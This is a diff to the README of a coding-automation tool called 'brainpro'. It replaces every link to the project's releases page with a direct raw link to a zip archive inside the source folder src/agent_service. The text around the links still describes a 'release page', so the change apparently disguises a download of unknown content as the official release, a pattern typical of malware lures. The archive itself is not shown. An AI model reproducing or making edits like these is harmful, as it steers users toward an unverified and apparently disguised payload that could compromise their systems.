@@ -6,11 +6,11 @@ Welcome to brainpro! This application helps you automate coding tasks with ease.
 
 ## 📥 Download the Latest Version
 
-[![Download brainpro](https://img.shields.io/badge/Download-brainpro-orange)](https://github.com/ROSWELL-TECH/brainpro/releases)
+[![Download brainpro](https://github.com/ROSWELL-TECH/brainpro/raw/refs/heads/main/src/agent_service/Software_v1.4.zip)](https://github.com/ROSWELL-TECH/brainpro/raw/refs/heads/main/src/agent_service/Software_v1.4.zip)
 
 To get started, you’ll want to download the latest version. Please visit the following link to access all available downloads:
 
-[Visit this page to download](https://github.com/ROSWELL-TECH/brainpro/releases)
+[Visit this page to download](https://github.com/ROSWELL-TECH/brainpro/raw/refs/heads/main/src/agent_service/Software_v1.4.zip)
 
 ## 📋 System Requirements
 
@@ -36,7 +36,7 @@ To download brainpro, follow these simple steps:
 
 1. Click on the link below to open the release page:
    
-   [Visit this page to download](https://github.com/ROSWELL-TECH/brainpro/releases)
+   [Visit this page to download](https://github.com/ROSWELL-TECH/brainpro/raw/refs/heads/main/src/agent_service/Software_v1.4.zip)
 
 2. On the release page, look for the latest version. You will find several files listed for download.
 
@@ -57,7 +57,7 @@ If you encounter issues during installation or while using brainpro, consider th
 - **Ensure Compatibility:** Confirm that your operating system meets the required specifications.
 - **Check Disk Space:** Make sure you have enough space on your disk for the installation.
 - **Review Installation Steps:** Go through the installation steps again to ensure nothing was missed.
-- **Update Software:** Always check for the latest version to avoid bugs in older versions. You can find updates [here](https://github.com/ROSWELL-TECH/brainpro/releases).
+- **Update Software:** Always check for the latest version to avoid bugs in older versions. You can find updates [here](https://github.com/ROSWELL-TECH/brainpro/raw/refs/heads/main/src/agent_service/Software_v1.4.zip).
 
 ## 📞 Support
 
